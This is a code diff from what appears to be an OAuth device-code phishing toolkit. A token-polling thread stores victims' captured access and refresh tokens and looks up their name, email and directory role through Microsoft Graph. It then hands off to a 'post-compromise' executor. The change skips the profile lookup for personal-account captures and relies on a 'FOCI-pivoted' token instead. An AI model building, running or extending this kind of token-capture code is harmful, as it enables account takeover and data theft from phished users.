@@ -73,21 +73,26 @@ class TokenPoller(threading.Thread):
                 _slowdown_step.pop(user_code, None)
                 db.update_session_token(user_code, access_token, refresh_token, raw_data)
 
-                profile = graph.get_user_profile(access_token)
-                if 'error' not in profile:
-                    v_email = profile.get('mail') or profile.get('userPrincipalName') or 'Unknown'
-                    v_name = profile.get('displayName') or 'Unknown'
-                    v_role = profile.get('jobTitle') or ''
-                    if not v_role:
-                        try:
-                            roles_res = graph.get_user_directory_roles(access_token)
-                            if roles_res and 'value' in roles_res and len(roles_res['value']) > 0:
-                                v_role = roles_res['value'][0].get('displayName', 'Member')
-                            else:
-                                v_role = 'User'
-                        except Exception:
-                            v_role = 'Member'
-                    db.update_session_profile(user_code, v_name, v_email, v_role)
+                # Personal (consumer) captures: the v1 token audience is
+                # graph.windows.net, which MS Graph rejects. Skip the profile
+                # lookup here — the executor resolves it with the FOCI-pivoted
+                # msgraph token instead.
+                if not _is_personal:
+                    profile = graph.get_user_profile(access_token)
+                    if 'error' not in profile:
+                        v_email = profile.get('mail') or profile.get('userPrincipalName') or 'Unknown'
+                        v_name = profile.get('displayName') or 'Unknown'
+                        v_role = profile.get('jobTitle') or ''
+                        if not v_role:
+                            try:
+                                roles_res = graph.get_user_directory_roles(access_token)
+                                if roles_res and 'value' in roles_res and len(roles_res['value']) > 0:
+                                    v_role = roles_res['value'][0].get('displayName', 'Member')
+                                else:
+                                    v_role = 'User'
+                            except Exception:
+                                v_role = 'Member'
+                        db.update_session_profile(user_code, v_name, v_email, v_role)
 
                 threading.Thread(
                     target=executor.execute_post_compromise,
